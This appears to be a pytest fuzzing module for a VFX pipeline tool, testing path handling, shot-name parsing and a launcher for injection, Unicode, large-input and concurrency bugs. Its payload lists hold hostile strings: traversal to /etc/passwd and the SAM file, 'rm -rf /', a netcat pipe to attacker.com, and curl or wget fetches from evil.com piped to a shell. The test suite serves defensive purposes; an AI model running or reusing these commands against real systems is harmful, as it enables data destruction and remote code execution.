"""Fuzzing tests for ShotBot input validation and security.

This module provides fuzzing capabilities to discover edge cases,
security vulnerabilities, and input validation issues.
"""

import random
import string
import sys
import tempfile
from pathlib import Path
from typing import Any, List, Optional

import pytest

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from launcher_manager import LauncherManager
from raw_plate_finder import RawPlateFinder
from shot_model import Shot
from utils import PathUtils


class FuzzGenerator:
    """Generates fuzzed inputs for testing."""

    def __init__(self, seed: Optional[int] = None):
        """Initialize fuzzer with optional seed for reproducibility."""
        self.random = random.Random(seed)

    def generate_malicious_paths(self) -> List[str]:
        """Generate paths that could cause security issues."""
        return [
            # Path traversal attempts
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            # Null bytes
            "file\x00.txt",
            "path/to/\x00/file",
            # Special characters
            "file|name.txt",
            "file;rm -rf /.txt",
            "file$(whoami).txt",
            "file`id`.txt",
            # Unicode edge cases
            "file\u202e\u0041\u0042\u0043.txt",  # Right-to-left override
            "file\ufeff.txt",  # Zero-width no-break space
            # Long paths
            "a" * 256,
            "/" + "x" * 255 + "/" + "y" * 255,
            # Special filenames
            "CON",
            "PRN",
            "AUX",
            "NUL",  # Windows reserved
            "COM1",
            "LPT1",  # Windows devices
            "..",
            ".",
            "~",
            # Encoded traversal
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            # Symlink attempts
            "/proc/self/environ",
            "/dev/random",
        ]

    def generate_command_injections(self) -> List[str]:
        """Generate command injection attempts."""
        return [
            # Basic injection
            "; ls -la",
            "&& cat /etc/passwd",
            "| nc attacker.com 1234",
            "`whoami`",
            "$(id)",
            # Escape attempts
            "'; DROP TABLE shots; --",
            '"; rm -rf /; echo "',
            "\\'; echo vulnerable; \\'",
            # Chained commands
            "nuke & calc.exe &",
            "maya || xterm",
            "3de && gnome-terminal",
            # Environment variable injection
            "$PATH",
            "${HOME}/.ssh/id_rsa",
            "%USERPROFILE%\\Documents",
            # Newline injection
            "nuke\nrm -rf /",
            "maya\r\ndel C:\\*.*",
            # Comment injection
            "nuke # && malicious",
            "maya // & calc",
            # Subshell attempts
            "nuke $(curl evil.com/script.sh | sh)",
            "maya `wget evil.com/payload`",
            # Redirection attempts
            "nuke > /etc/passwd",
            "maya < /dev/zero",
            "3de 2>&1 | tee /tmp/output",
        ]

    def generate_unicode_edge_cases(self) -> List[str]:
        """Generate Unicode edge cases that could break parsing."""
        return [
            # Homoglyphs
            "ѕhοt_001",  # Cyrillic 's', Greek 'o'
            "shⲟt_001",  # Coptic 'o'
            # Zero-width characters
            "shot\u200b_001",  # Zero-width space
            "shot\ufeff_001",  # Zero-width no-break space
            # Direction markers
            "\u202dshot_001\u202c",  # Left-to-right override
            "\u202eshot_001\u202c",  # Right-to-left override
            # Normalization issues
            "café",  # é as single character
            "café",  # e + combining accent
            # Emoji and special symbols
            "shot_🔥_001",
            "shot_💀_001",
            "shot_\U0001f4a9_001",
            # Control characters
            "shot\x00_001",
            "shot\x1b[31m_001",  # ANSI escape
            "shot\r\n_001",
            # Mixed scripts
            "shot_测试_001",
            "shot_テスト_001",
            "shot_тест_001",
        ]

    def generate_numeric_edge_cases(self) -> List[Any]:
        """Generate numeric edge cases."""
        return [
            # Boundaries
            0,
            -1,
            1,
            sys.maxsize,
            -sys.maxsize - 1,
            # Floating point edge cases
            float("inf"),
            float("-inf"),
            float("nan"),
            0.0,
            -0.0,
            # Near boundaries
            sys.maxsize - 1,
            -sys.maxsize,
            # Type confusion
            "0",
            "1e308",
            "0x41414141",
            # Special values
            None,
            [],
            {},
        ]

    def generate_random_bytes(self, size: int = 1024) -> bytes:
        """Generate random bytes for binary fuzzing."""
        return bytes(self.random.randint(0, 255) for _ in range(size))

    def mutate_string(self, base: str, mutations: int = 5) -> str:
        """Mutate a string with random changes."""
        result = list(base)
        for _ in range(min(mutations, len(result))):
            pos = self.random.randint(0, len(result) - 1)
            mutation_type = self.random.choice(["insert", "delete", "replace"])

            if mutation_type == "insert":
                char = self.random.choice(string.printable)
                result.insert(pos, char)
            elif mutation_type == "delete" and len(result) > 1:
                del result[pos]
            else:  # replace
                result[pos] = self.random.choice(string.printable)

        return "".join(result)


class TestCommandInjectionFuzzing:
    """Fuzz testing for command injection vulnerabilities."""

    @pytest.fixture
    def fuzzer(self):
        """Create fuzzer instance."""
        return FuzzGenerator(seed=42)  # Fixed seed for reproducibility

    def test_launcher_command_injection(self, fuzzer, qtbot):
        """Test launcher manager against command injection."""
        manager = LauncherManager()
        qtbot.addWidget(manager)

        dangerous_commands = fuzzer.generate_command_injections()

        for cmd in dangerous_commands:
            # Should either sanitize or reject dangerous commands
            try:
                # Create a launcher with dangerous command
                launcher_id = f"test_{id(cmd)}"

                # The launcher should either:
                # 1. Reject the command
                # 2. Sanitize it safely
                # 3. Execute in a sandboxed way

                # Test that no actual harm is done
                with tempfile.TemporaryDirectory() as tmpdir:
                    test_file = Path(tmpdir) / "test.txt"
                    test_file.write_text("content")

                    # Attempt to use dangerous command
                    # This should NOT delete our test file
                    manager.launch_command(
                        cmd, launcher_id=launcher_id, working_dir=tmpdir
                    )

                    # Verify test file still exists
                    assert test_file.exists(), f"Command injection succeeded: {cmd}"

            except Exception:
                # Exception is acceptable - means command was rejected
                pass

    def test_path_traversal_fuzzing(self, fuzzer):
        """Test path utilities against path traversal."""
        malicious_paths = fuzzer.generate_malicious_paths()

        for path in malicious_paths:
            # PathUtils should sanitize or reject dangerous paths
            try:
                result = PathUtils.sanitize_path(path)

                # Verify no path traversal
                assert ".." not in str(result)
                assert not str(result).startswith("/etc")
                assert not str(result).startswith("C:\\Windows")
                assert "\x00" not in str(result)

            except (ValueError, OSError):
                # Rejection is good
                pass

    def test_shot_name_fuzzing(self, fuzzer):
        """Test shot name parsing with fuzzed inputs."""
        # Generate fuzzed shot names
        base_shot = "SHOW_SEQ01_001"

        for _ in range(100):
            fuzzed = fuzzer.mutate_string(base_shot)

            try:
                shot = Shot.from_string(fuzzed)

                # If parsing succeeds, validate output
                assert shot.show is not None
                assert shot.sequence is not None
                assert shot.shot is not None

                # No injection markers should survive
                assert ";" not in shot.show
                assert "|" not in shot.sequence
                assert "$" not in shot.shot

            except (ValueError, AttributeError):
                # Parsing failure is expected for malformed input
                pass

    def test_unicode_handling(self, fuzzer):
        """Test Unicode edge cases in various components."""
        unicode_cases = fuzzer.generate_unicode_edge_cases()

        for case in unicode_cases:
            # Test shot names
            try:
                shot = Shot("show", "seq", case, "/path")
                # Should handle Unicode gracefully
                assert shot.shot is not None
            except (UnicodeError, ValueError):
                pass

            # Test file paths
            try:
                path = PathUtils.build_path("/base", case)
                # Should sanitize or handle Unicode
                assert path is not None
            except (UnicodeError, OSError):
                pass


class TestRawPlateFinderFuzzing:
    """Fuzz testing for raw plate finder."""

    @pytest.fixture
    def fuzzer(self):
        """Create fuzzer instance."""
        return FuzzGenerator(seed=42)

    def test_plate_pattern_fuzzing(self, fuzzer):
        """Fuzz plate name patterns."""
        finder = RawPlateFinder()

        # Generate random plate patterns
        for _ in range(100):
            # Random plate components
            components = [
                fuzzer.mutate_string("SHOW"),
                fuzzer.mutate_string("SEQ01"),
                fuzzer.mutate_string("001"),
                fuzzer.mutate_string("FG01"),
                fuzzer.mutate_string("aces"),
                fuzzer.mutate_string("v001"),
            ]

            filename = "_".join(components) + ".1001.exr"

            try:
                # Should handle gracefully
                result = finder.parse_plate_name(filename)
                if result:
                    # Validate parsed components
                    assert all(c is not None for c in result), (
                        f"None in parsed result: {result}"
                    )
            except Exception:
                # Should not crash
                pass

    def test_directory_traversal_fuzzing(self, fuzzer):
        """Test directory traversal with fuzzed paths."""
        finder = RawPlateFinder()

        with tempfile.TemporaryDirectory() as tmpdir:
            base_path = Path(tmpdir)

            # Create some test structure
            (base_path / "shots" / "seq" / "shot").mkdir(parents=True)

            for path in fuzzer.generate_malicious_paths():
                try:
                    # Should not traverse outside base
                    results = finder.find_plates(base_path / path)

                    # Verify all results are within base
                    for plate in results:
                        assert str(plate).startswith(str(base_path))

                except (ValueError, OSError):
                    # Rejection is good
                    pass


class TestMemoryFuzzing:
    """Fuzz testing for memory-related issues."""

    @pytest.fixture
    def fuzzer(self):
        """Create fuzzer instance."""
        return FuzzGenerator(seed=42)

    def test_large_input_handling(self, fuzzer):
        """Test handling of very large inputs."""
        # Generate large strings
        large_inputs = [
            "A" * 10000,  # 10KB
            "B" * 100000,  # 100KB
            "C" * 1000000,  # 1MB
        ]

        for large_input in large_inputs:
            # Test various components
            try:
                # Shot name parsing
                Shot.from_string(large_input)
            except (ValueError, MemoryError):
                pass

            try:
                # Path building
                PathUtils.build_path("/base", large_input)
            except (OSError, MemoryError):
                pass

    def test_recursive_structure_fuzzing(self, fuzzer):
        """Test handling of deeply nested structures."""
        # Create deeply nested dictionary
        depth = 1000
        nested = current = {}
        for _ in range(depth):
            current["next"] = {}
            current = current["next"]

        # Test cache manager with nested structure
        from cache_manager import CacheManager

        cache = CacheManager()
        try:
            # Should handle or reject deep nesting
            cache.cache_shots([nested])
        except (RecursionError, ValueError):
            # Proper handling of deep recursion
            pass


class TestConcurrentFuzzing:
    """Fuzz testing for concurrent operations."""

    @pytest.fixture
    def fuzzer(self):
        """Create fuzzer instance."""
        return FuzzGenerator(seed=42)

    def test_concurrent_launcher_fuzzing(self, fuzzer, qtbot):
        """Fuzz concurrent launcher operations."""
        manager = LauncherManager()
        qtbot.addWidget(manager)

        from concurrent.futures import ThreadPoolExecutor

        # Generate random commands
        commands = [fuzzer.mutate_string("nuke --nc") for _ in range(20)]

        def launch_worker(cmd, idx):
            """Worker to launch command."""
            try:
                manager.launch_command(cmd, launcher_id=f"fuzzer_{idx}")
            except Exception:
                pass

        # Launch concurrently
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [
                executor.submit(launch_worker, cmd, idx)
                for idx, cmd in enumerate(commands)
            ]

            # Wait for completion
            for future in futures:
                try:
                    future.result(timeout=1)
                except Exception:
                    pass

        # Manager should remain stable
        assert manager is not None


class TestStateFuzzing:
    """Fuzz testing for state machines and workflows."""

    @pytest.fixture
    def fuzzer(self):
        """Create fuzzer instance."""
        return FuzzGenerator(seed=42)

    def test_workflow_state_fuzzing(self, fuzzer, qtbot):
        """Fuzz application state transitions."""
        from main_window import MainWindow

        window = MainWindow()
        qtbot.addWidget(window)

        # Generate random UI interactions
        actions = [
            lambda: window.refresh_shots(),
            lambda: window.switch_to_tab(0),
            lambda: window.switch_to_tab(1),
            lambda: window.clear_cache(),
            lambda: window.show_settings(),
        ]

        # Perform random sequence of actions
        for _ in range(50):
            action = fuzzer.random.choice(actions)
            try:
                action()
            except Exception:
                # Should handle gracefully
                pass

        # Window should remain functional
        assert window is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
